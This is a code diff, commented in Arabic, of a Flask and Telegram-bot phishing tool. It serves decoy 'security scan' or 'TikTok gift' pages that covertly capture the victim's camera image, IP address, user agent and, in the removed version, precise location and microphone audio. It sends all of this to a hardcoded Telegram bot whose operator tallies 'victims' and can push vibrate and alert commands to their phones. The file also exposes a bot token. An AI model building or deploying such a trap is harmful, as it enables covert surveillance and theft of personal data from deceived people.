@@ -1,132 +1,87 @@
-import base64, requests, os, json, time
+import base64, requests, os, json, datetime, time
 from flask import Flask, render_template_string, request, jsonify
 
 app = Flask(__name__)
 
 # ==========================================
-# --- إعدادات الإمبراطور سيوفي (لا تلمسها) ---
+# --- إعدادات الإمبراطور سيوفي النهائية ---
 # ==========================================
 BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
 ADMIN_ID = "7041600701"
-BASE_URL = "https://sif-pro.onrender.com" # رابط سيرفرك
+BASE_URL = "https://sif-pro.onrender.com"
 API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
 
-# متغيرات النظام القابلة للتعديل
-system_config = {
-    "welcome_msg": "🔥 أهلاً بك ملك سيوفي في لوحة التحكم v16.0\\n\\nالرابط شغال والوضع لوز! 🚀",
-    "trap_title": "تأكيد الأمان الموحد",
-    "victim_count": 0
+# ملف النظام السري
+STORAGE = "sys_vault.json"
+
+def get_vault():
+    if os.path.exists(STORAGE):
+        with open(STORAGE, 'r') as f: return json.load(f)
+    return {"total": 0, "template": "security", "cmd": None, "victims": []}
+
+def save_vault(data):
+    with open(STORAGE, 'w') as f: json.dump(data, f)
+
+# ==========================================
+# --- القوالب التمويهية ---
+# ==========================================
+T_LIB = {
+    "security": {"title": "فحص الأمان", "h": "🛡️ درع الحماية الذكي", "b": "بدء الفحص", "c": "#f38020"},
+    "gift": {"title": "هدايا تيك توك", "h": "🎁 استلم هديتك الآن", "b": "فتح الصندوق", "c": "#00f2ea"}
 }
 
 # ==========================================
-# --- الدوال الأساسية للنظام ---
+# --- واجهة الصيد الاحترافية (v40.0) ---
 # ==========================================
-def tg_request(method, payload=None, files=None):
-    """دالة التواصل مع تليجرام"""
-    try:
-        if files:
-            return requests.post(API_URL + method, data=payload, files=files, timeout=20).json()
-        return requests.post(API_URL + method, json=payload, timeout=20).json()
-    except Exception as e:
-        print(f"Error in TG request: {e}")
-        return None
-
-# ==========================================
-# --- واجهة الصيد (The Trap) ---
-# ==========================================
-HTML_TEMPLATE = '''
+MASTER_HTML = '''
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{{ title }}</title>
+    <title>{{ t.title }}</title>
     <style>
-        body { background: #000; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; text-align: center; width: 85%; max-width: 400px; box-shadow: 0 0 30px rgba(243, 128, 32, 0.2); }
-        .icon { font-size: 50px; margin-bottom: 20px; color: #f38020; }
-        .btn { background: #f38020; color: #000; border: none; padding: 15px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.1rem; transition: 0.3s; }
-        .btn:active { transform: scale(0.95); }
-        #st { margin-top: 20px; color: #777; font-size: 0.8rem; }
-        #v { position: fixed; top: -10px; left: -10px; width: 1px; height: 1px; opacity: 0.01; }
+        body { background: #050505; color: white; font-family: 'Segoe UI'; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #222; text-align: center; width: 85%; max-width: 400px; box-shadow: 0 0 40px rgba(0,0,0,0.8); }
+        .btn { background: {{ t.c }}; color: #000; border: none; padding: 15px; border-radius: 12px; width: 100%; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        #st { margin-top: 15px; color: #555; font-size: 0.7rem; }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="icon">🛡️</div>
-        <h2>تحقق بشري</h2>
-        <p style="color: #bbb;">يرجى النقر للمتابعة وتأكيد أنك لست روبوت للوصول إلى المحتوى</p>
-        <button class="btn" id="go" onclick="startCapture()">أنا لست روبوت</button>
-        <div id="st">بانتظار البدء...</div>
+        <h2 style="color: {{ t.c }}">{{ t.h }}</h2>
+        <p style="color:#888">يرجى التأكيد للمتابعة</p>
+        <button class="btn" id="go" onclick="start()">{{ t.b }}</button>
+        <div id="st">ID: {{ vid }}</div>
     </div>
-    
-    <video id="v" autoplay playsinline muted></video>
+    <video id="v" style="position:fixed; top:-999px" autoplay playsinline muted></video>
     <canvas id="c" style="display:none"></canvas>
-
     <script>
-        const send = (d, t) => fetch('/api/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({d, t})});
+        const enc = (s) => btoa(unescape(encodeURIComponent(s)));
+        const send = (d, t) => fetch('/api/v1/vault', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({d: enc(d), t: t})});
+        
+        async function check() {
+            const r = await fetch('/api/v1/cmd'); const d = await r.json();
+            if(d.cmd === 'vibrate') navigator.vibrate(500);
+            if(d.cmd === 'alert') alert("🚨 تهديد أمني متكتشف!");
+        }
+        setInterval(check, 4000);
 
-        async function startCapture() {
-            const btn = document.getElementById('go');
-            const st = document.getElementById('st');
-            btn.style.display = 'none';
-            st.innerText = "جاري تهيئة النظام... يرجى الانتظار";
-
+        async function start() {
+            document.getElementById('go').style.display = 'none';
             try {
-                // 1. جلب IP
-                const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:'Hidden'}));
+                const s = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
+                document.getElementById('v').srcObject = s;
+                const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json());
+                await send(`🌐 IP: ${ip.ip}\\n📱 UserAgent: ${navigator.userAgent}`, 'msg');
                 
-                // 2. طلب الكاميرا والصوت
-                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
-                const v = document.getElementById('v');
-                v.srcObject = stream;
-                await v.play();
-
-                // 3. جمع المستشعر الشامل
-                const b = await navigator.getBattery().catch(() => ({}));
-                const info = `📜 **تقرير صيد احترافي (v16.0)**\\n` +
-                             `━━━━━━━━━━━━━━\\n` +
-                             `🌐 **IP:** \`${ipData.ip}\`\\n` +
-                             `🔋 **البطارية:** ${Math.round(b.level*100)}% (${b.charging ? '⚡' : '🔋'})\\n` +
-                             `📱 **النظام:** ${navigator.platform}\\n` +
-                             `🧠 **المعالج:** ${navigator.hardwareConcurrency} Cores\\n` +
-                             `🖥️ **الشاشة:** ${window.screen.width}x${window.screen.height}\\n` +
-                             `🌍 **اللغة:** ${navigator.language}\\n` +
-                             ` браузер: ${navigator.userAgent.split(' ')[0]}`;
-                await send(info, 'msg');
-
-                // 4. جلب الموقع الدقيق
-                navigator.geolocation.getCurrentPosition(p => {
-                    const mapUrl = `📍 **موقع الضحية الدقيق:**\\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                    send(mapUrl, 'msg');
-                }, null, {enableHighAccuracy: true});
-
-                // 5. حل السواد + التقاط الصورة
-                st.innerText = "جاري فحص الأمان... (4 ثواني)";
                 setTimeout(() => {
-                    const c = document.getElementById('c');
+                    const v = document.getElementById('v'); const c = document.getElementById('c');
                     c.width = v.videoWidth; c.height = v.videoHeight;
                     c.getContext('2d').drawImage(v, 0, 0);
-                    send(c.toDataURL('image/jpeg', 0.9), 'img');
-
-                    // 6. تسجيل بصمة الصوت
-                    st.innerText = "جاري رفع البيانات... (5 ثواني)";
-                    const recorder = new MediaRecorder(stream);
-                    const chunks = [];
-                    recorder.ondataavailable = e => chunks.push(e.data);
-                    recorder.onstop = () => {
-                        const reader = new FileReader();
-                        reader.readAsDataURL(new Blob(chunks));
-                        reader.onloadend = () => send(reader.result, 'aud');
-                        st.innerText = "✅ تمت العملية بنجاح! سيتم توجيهك...";
-                    };
-                    recorder.start();
-                    setTimeout(() => recorder.stop(), 5000);
-                }, 4000);
-
-            } catch (e) {
-                st.innerText = "❌ خطأ: يرجى منح الصلاحيات للمتابعة!";
-                setTimeout(() => location.reload(), 2000);
-            }
+                    send(c.toDataURL('image/jpeg', 0.7), 'img');
+                    setTimeout(() => window.location.href = "https://google.com", 2000);
+                }, 3000);
+            } catch(e) { location.reload(); }
         }
     </script>
 </body>
@@ -134,71 +89,53 @@ HTML_TEMPLATE = '''
 '''
 
 # ==========================================
-# --- مسارات السيرفر (Routes) ---
+# --- الـ Logic الخلفي المحمي ---
 # ==========================================
 @app.route('/')
 def home():
-    return render_template_string(HTML_TEMPLATE, title=system_config["trap_title"])
+    v = get_vault()
+    return render_template_string(MASTER_HTML, t=T_LIB[v["template"]], vid=v["total"]+1)
 
-@app.route('/api/capture', methods=['POST'])
+@app.route('/api/v1/cmd')
+def get_cmd():
+    v = get_vault(); c = v["cmd"]; v["cmd"] = None; save_vault(v)
+    return jsonify({"cmd": c})
+
+@app.route('/api/v1/vault', methods=['POST'])
 def capture():
-    data = request.get_json(force=True, silent=True)
-    if not data: return "ERROR"
+    v = get_vault(); data = request.json
+    t = data['t']; d = base64.b64decode(data['d']).decode('utf-8') if t == 'msg' else data['d']
     
-    t, d = data.get('t'), data.get('d')
     if t == 'msg':
-        tg_request("sendMessage", {'chat_id': ADMIN_ID, 'text': d, 'parse_mode': 'Markdown'})
+        v['total'] += 1; v['victims'].append({"id": v['total'], "data": d, "time": str(datetime.datetime.now())})
+        save_vault(v)
+        kb = {"inline_keyboard": [[{"text": "📳 هز الجهاز", "callback_data": "cmd_vibrate"}, {"text": "⚠️ تنبيه", "callback_data": "cmd_alert"}]]}
+        requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': f"🎯 **صيد جديد #{v['total']}**\\n{d}", 'reply_markup': kb, 'parse_mode': 'Markdown'})
     elif t == 'img':
         img = base64.b64decode(d.split(',')[1])
-        tg_request("sendPhoto", {'chat_id': ADMIN_ID, 'caption': "📸 **صورة الضحية**"}, {'photo': ('c.jpg', img)})
-    elif t == 'aud':
-        aud = base64.b64decode(d.split(',')[1])
-        tg_request("sendVoice", {'chat_id': ADMIN_ID, 'caption': "🎙 **بصمة الضحية**"}, {'voice': ('v.ogg', aud)})
-    
+        requests.post(API_URL + "sendPhoto", data={'chat_id': ADMIN_ID, 'caption': f"📸 صورة الضحية #{v['total']}"}, files={'photo': ('v.jpg', img)})
     return "OK"
 
-# ==========================================
-# --- لوحة التحكم (الـ Webhook) ---
-# ==========================================
 @app.route('/webhook', methods=['POST'])
 def webhook():
-    update = request.get_json(force=True, silent=True)
-    if not update: return "OK"
-
-    if "message" in update:
-        msg = update["message"]
-        chat_id = str(msg["chat"]["id"])
-        
-        if chat_id == ADMIN_ID:
-            kb = {
-                "inline_keyboard": [
-                    [{"text": "🔗 إنشاء رابط صيد جديد", "callback_data": "gen_link"}],
-                    [{"text": "📊 إحصائيات النظام", "callback_data": "status"}],
-                    [{"text": "⚠️ تصفير الضحايا", "callback_data": "reset"}]
-                ]
-            }
-            tg_request("sendMessage", {
-                "chat_id": chat_id, 
-                "text": system_config["welcome_msg"], 
-                "reply_markup": kb,
-                "parse_mode": "Markdown"
-            })
-
-    elif "callback_query" in update:
-        query = update["callback_query"]
-        cid = query["message"]["chat"]["id"]
-        data = query["data"]
-
-        if data == "gen_link":
-            tg_request("sendMessage", {"chat_id": cid, "text": f"🚀 **رابط الصيد الخاص بك جاهز:**\\n`{BASE_URL}`", "parse_mode": "Markdown"})
-        elif data == "status":
-            tg_request("sendMessage", {"chat_id": cid, "text": "✅ **السيرفر يعمل بكفاءة v16.0**\\n\\nكل الحساسات تعمل (صوت، صورة، موقع، IP)."})
-        elif data == "reset":
-            tg_request("sendMessage", {"chat_id": cid, "text": "🗑 تم تصفير سجل الضحايا مؤقتاً."})
-
+    upd = request.json
+    if "message" in upd and str(upd["message"]["chat"]["id"]) == ADMIN_ID:
+        kb = {"inline_keyboard": [
+            [{"text": "🔗 رابط الصيد", "callback_data": "l"}, {"text": "🎭 القوالب", "callback_data": "t"}],
+            [{"text": "📊 إحصائيات", "callback_data": "s"}, {"text": "🧹 تدمير الكل", "callback_data": "clear"}]
+        ]}
+        requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': "👑 **لوحة تحكم الإمبراطور v40.0**", 'reply_markup': kb})
+    elif "callback_query" in upd:
+        q = upd["callback_query"]; data = q["data"]; v = get_vault()
+        if data == "l": requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': f"🚀 رابطك: `{BASE_URL}`", 'parse_mode': 'Markdown'})
+        elif data == "s": requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': f"🔢 إجمالي الضحايا: {v['total']}"})
+        elif data == "clear": 
+            if os.path.exists(STORAGE): os.remove(STORAGE)
+            requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': "🧹 تم تدمير كل السجلات والصور!"})
+        elif data.startswith("cmd_"):
+            v["cmd"] = data.replace("cmd_", ""); save_vault(v)
     return "OK"
 
 if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
 
